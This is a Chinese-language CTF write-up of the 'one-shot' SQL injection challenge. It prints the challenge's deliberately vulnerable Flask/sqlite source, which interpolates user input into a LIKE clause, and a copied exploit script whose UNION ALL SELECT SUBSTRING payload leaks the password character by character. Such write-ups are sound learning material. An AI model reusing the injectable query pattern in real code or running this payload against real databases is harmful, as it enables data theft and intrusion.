很有意思的一道sql注入题，让我对于flask的sqlite查询函数有了崭新的理解

源码如下

```python
from flask import Flask, request, make_response
import sqlite3
import os
import re

app = Flask(__name__)
db = sqlite3.connect(":memory:", check_same_thread=False)
flag = open("flag.txt").read()


@app.route("/")
def home():
    return """
    <h1>You have one shot.</h1>
    <form action="/new_session" method="POST"><input type="submit" value="New Session"></form>
    """


@app.route("/new_session", methods=["POST"])
def new_session():
    id = os.urandom(8).hex()
    db.execute(f"CREATE TABLE table_{id} (password TEXT, searched INTEGER)")
    db.execute(f"INSERT INTO table_{id} VALUES ('{os.urandom(16).hex()}', 0)")
    res = make_response(f"""
    <h2>Fragments scattered... Maybe a search will help?</h2>
    <form action="/search" method="POST">
        <input type="hidden" name="id" value="{id}">
        <input type="text" name="query" value="">
        <input type="submit" value="Find">
    </form>
""")
    res.status = 201

    return res


@app.route("/search", methods=["POST"])
def search():
    id = request.form["id"]
    if not re.match("[1234567890abcdef]{16}", id):
        return "invalid id"
    searched = db.execute(f"SELECT searched FROM table_{id}").fetchone()[0]
    if searched:
        return "you've used your shot."

    db.execute(f"UPDATE table_{id} SET searched = 1")

    query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")
    return f"""
    <h2>Your results:</h2>
    <ul>
    {"".join([f"<li>{row[0][0] + '*' * (len(row[0]) - 1)}</li>" for row in query.fetchall()])}
    </ul>
    <h3>Ready to make your guess?</h3>
    <form action="/guess" method="POST">
        <input type="hidden" name="id" value="{id}">
        <input type="text" name="password" placehoder="Password">
        <input type="submit" value="Guess">
    </form>
"""


@app.route("/guess", methods=["POST"])
def guess():
    id = request.form["id"]
    if not re.match("[1234567890abcdef]{16}", id):
        return "invalid id"
    result = db.execute(f"SELECT password FROM table_{id} WHERE password = ?", (request.form['password'],)).fetchone()
    if result != None:
        return flag

    db.execute(f"DROP TABLE table_{id}")
    return "You failed. <a href='/'>Go back</a>"


@app.errorhandler(500)
def ise(error):
    original = getattr(error, "original_exception", None)
    if type(original) == sqlite3.OperationalError and "no such table" in repr(original):
        return "that table is gone. <a href='/'>Go back</a>"
    return "Internal server error"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)

```

大概就是一次机会然后去猜password，猜对的话会给flag

感觉自己对于web源码的嗅觉不够灵敏

开始一直在想在guess()的部分用sql注入直接绕过去，后面看了exp发现是在search的部分去sql注入其实确实也是这样的，不然为什么search的函数里面是这里按理说直接用fetchone了为什么要用fetchall

```python
{"".join([f"<li>{row[0][0] + '*' * (len(row[0]) - 1)}</li>" for row in query.fetchall()])}
```

直接用union 注入获取password然后获取flag

抄了一个exp过来

```python
import requests
import re

URL = "http://one-shot.amt.rs"


# Get session id
def get_session():
    res = requests.post(URL + "/new_session")
    return res.text.split('type="hidden" name="id" value="')[1].split('"')[0]


# Search for password, use malicious query
def search(session: str, query: str):
    query = query.replace("{id}", session)
    res = requests.post(URL + "/search", data={"id": session, "query": query})
    return re.findall(r"<li>(.*?)</li>", res.text)


# Guess the password
def guess(session: str, password: str):
    res = requests.post(URL + "/guess", data={"id": session, "password": password})
    return res.text


# Build a malicious query
def build_query():
    query = "%' OR 1=1"

    for n in range(1, 33):
        query += f" UNION ALL SELECT SUBSTRING(password, {n}, 1) FROM table_" + "{id}"

    return query + " --"


session = get_session()

vals = search(session, build_query())
vals = [val for val in vals if len(val) == 1] # get only characters
print(guess(session, "".join(vals)))
```

